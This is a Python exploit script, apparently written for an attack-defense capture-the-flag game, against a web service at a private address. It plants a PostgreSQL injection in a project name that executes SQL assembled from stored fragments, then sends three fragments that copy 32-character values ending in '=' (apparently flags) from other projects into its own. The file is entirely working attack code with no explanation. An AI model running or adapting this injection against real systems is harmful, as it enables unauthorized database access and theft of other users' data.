import requests
import random
import json
import string

s = requests.Session()
rand_part1 = "".join(random.choices(string.ascii_lowercase+string.digits,k=5))
rand_part2 = "".join(random.choices(string.ascii_lowercase+string.digits,k=7))

# FIRST REQUEST 
url = "http://10.60.17.3:3000/projects"
payload = {"name": "{}(i int);DO $$BEGIN EXECUTE(SELECT string_agg(v,'')FROM(select*from data WHERE left(k,7)='{}'ORDER BY k)T);END$$;--".format(rand_part1,rand_part2)}
print(f"Using payload: {json.dumps(payload)}")
r = s.post(url,data=payload)
id = r.text[1:len(r.text)-1]
print(f"Using ID: {id}")

# SECOND REQUEST
url = "http://10.60.17.3:3000/projects/{}".format(id)
payload = {"k": "eijxzbm1", "v": "INSERT INTO data(project_id,k,v)(SELECT '{}',ROW_NUMBER()OVER(orde".format(id)}
r = s.post(url,data=payload)
print(f"SECOND: {r.text}")

# THIRD REQUEST
payload = {"k": "eijxzbm2", "v": "r by k)AS string,substring(v from 0 for 32)FROM data WHERE char_length(v)=32 AND substring(v from 32"}
r = s.post(url,data=payload)
print(f"THIRD: {r.text}")

# FOURTH REQUEST
payload = {"k": "eijxzbm3", "v": ")='='); -- "}
r = s.post(url,data=payload)
print(f"FOURTH: {r.text}")